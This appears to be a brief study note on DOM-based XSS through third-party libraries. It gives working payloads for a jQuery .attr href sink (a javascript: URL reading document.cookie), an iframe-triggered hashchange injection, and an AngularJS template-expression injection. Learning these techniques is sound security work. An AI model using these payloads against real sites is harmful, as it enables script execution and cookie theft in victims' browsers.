# dom-based trough third party dependencies

Modern web applications are typically built using a number of third-party libraries and frameworks, some of these are also potential sources and sinks for DOM XSS.

## jQuery

#### exploit the `.attr` function

`https://www.example.com/feedback?returnPath=/post`

->

```
$(function () {
  $("#backLink").attr(
    "href",
    new URLSearchParams(window.location.search).get("returnPath"),
  );
});
```

- the backLink id element will be updated with url returnPath's value

`javascript:alert(document.cookie)`

`https://www.example.com/feedback?returnPath=javascript:alert(document.cookie)`

- just click on the backLink id link

---

#### hashchange

To actually exploit this classic vulnerability, you'll need to find a way to trigger a hashchange event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an iframe:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`

In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire.

## AngularJS

When a site uses the ng-app attribute on an HTML element, it will be processed by AngularJS, in that case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.

in the search input simply put ->

`{{$on.constructor('alert(1)')()}}`

or in the url ->

`https://www.example.com/?search={{$on.constructor('alert(1)')()}}`
